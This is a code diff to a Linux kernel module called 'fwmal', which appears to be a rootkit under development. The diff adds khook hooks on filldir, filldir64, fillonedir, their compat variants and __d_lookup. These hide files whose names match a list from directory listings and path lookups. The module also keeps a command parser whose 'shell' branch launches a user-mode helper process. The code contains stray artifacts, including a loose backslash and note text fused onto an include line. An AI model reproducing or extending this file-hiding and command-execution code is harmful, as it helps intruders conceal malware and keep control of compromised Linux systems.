@@ -11,6 +11,7 @@
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
 #include <linux/ip.h>
+#include <linux/list.h>
 #include <linux/sched.h>   //wake_up_process()
 #include <linux/kthread.h> //kthread_create()、kthread_run()
 #include <linux/err.h>           //IS_ERR()、PTR_ERR()2.实现（kthread_create 与kthread_run区别）
@@ -21,10 +22,140 @@
 #define ADRESS "127.0.0.1"
 #define BUFFER_SIZE 1024
 #define SLEEP_TIME 10*1000
+#define HIDEFILE "fwmal"
 //static struct nf_hook_ops my_nf_hook;
 struct task_struct *background_task;
 struct socket *socket;
 struct sockaddr_in s_addr;
+
+LIST_HEAD(files);
+struct fwmal_filename{
+	char* name;
+	struct list_head list;
+};
+
+int addfile(const char* name){
+	struct fwmal_filename *file = kmalloc(sizeof(struct fwmal_filename), GFP_KERNEL);
+	file->name = kmalloc(strlen(name)+1, GFP_KERNEL);
+	memcpy(file->name, name, strlen(name));
+	file->name[strlen(name)] = '\0';
+	list_add_tail(&file->list, &files);
+	printk("[fwmal]:ssss%s\n",file->name);
+	return 0;
+}
+
+int deletefile(struct fwmal_filename* file){
+	list_del(&file->list);
+	kfree(file->name);
+	kfree(file);
+	return 0;
+}
+
+KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_fillonedir(void *__buf, const char *name, int namlen,
+			    loff_t offset, u64 ino, unsigned int d_type)
+{
+	struct list_head* ld;
+	int ret = 0;
+	list_for_each(ld,&files){
+		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
+		if (strstr(name, container_of(ld,struct fwmal_filename,list)->name)){printk("[fwmal]:ddd%s\n",name); return ret;}
+		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
+	}
+	return KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
+}
+
+
+KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_filldir(void *__buf, const char *name, int namlen,
+			 loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	struct list_head* ld;
+	list_for_each(ld,&files){\
+		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
+		if (strstr(name, container_of(ld,struct fwmal_filename,list)->name)){printk("[fwmal]:ddd%s\n",name); return ret;}
+		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
+	}
+	ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
+	return ret;
+}
+
+KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_filldir64(void *__buf, const char *name, int namlen,
+			   loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	struct list_head* ld;
+	list_for_each(ld,&files){
+		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
+		if (strstr(name, container_of(ld,struct fwmal_filename,list)->name)){printk("[fwmal]:ddd%s\n",name); return ret;}
+		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
+	}
+	ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
+	return ret;
+}
+
+KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
+				   loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	struct list_head* ld;
+	list_for_each(ld,&files){
+		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
+		if (strstr(name, (const char *)(container_of(ld,struct fwmal_filename,list)->name))){printk("[fwmal]:ddd%s\n",name); return ret;}
+		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
+	}
+	ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
+	return ret;
+}
+
+KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_compat_filldir(void *__buf, const char *name, int namlen,
+				loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	struct list_head* ld;
+	list_for_each(ld,&files){
+		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
+		if (strstr(name, (const char *)(container_of(ld,struct fwmal_filename,list)->name))){printk("[fwmal]:ddd%s\n",name); return ret;}
+		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
+	}
+	ret = KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
+	return ret;
+}
+
+KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
+static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
+				  loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	struct list_head* ld;
+	list_for_each(ld,&files){
+		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
+		if (strstr(name, (const char *)(container_of(ld,struct fwmal_filename,list)->name))){printk("[fwmal]:ddd%s\n",name); return ret;}
+		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
+	}
+	ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
+	return ret;
+}
+
+KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
+struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
+{
+	struct dentry *found = NULL;
+	struct list_head* ld;
+	list_for_each(ld,&files){
+		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
+		if (strstr(name->name, (const char *)(container_of(ld,struct fwmal_filename,list)->name))){printk("[fwmal]:ddd%s\n",name->name); return found;}
+		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
+	}
+	found = KHOOK_ORIGIN(__d_lookup, parent, name);
+	return found;
+}
+
+
 /*
 #include <linux/fs.h> // has inode_permission() proto
 KHOOK(inode_permission);
@@ -123,10 +254,11 @@ int parse(char* buf){
 	*/
 	printk("[fwmal]:parse\n");
 	if(strcmp(buf,"shell") == 0){
-		printk("[fwmal]:shell\n");
 		return call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_EXEC); //call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+	}else if(strcmp(buf,"hidefile")==0){
+		printk("[fwmal]:hidefile");
 	}
-	printk("[fwmal]:parse other\n");
+	
 	return 0;
 }
 
@@ -201,10 +333,12 @@ static int __init fwmal_init(void)
 	int ret = khook_init();
 	//init_thread();
 	//init_nf();
-	ret = parse("shell");
+	//ret = parse("hidefile");
+	addfile("fwmaltest");
+
 	if (ret != 0)
 		goto out;
-	printk("[fwmal]:%d\n",ret);
+	//printk("[fwmal]:%d\n",ret);
 	printk("[fwmal]:Hello World\n");
 out:
 	return ret;
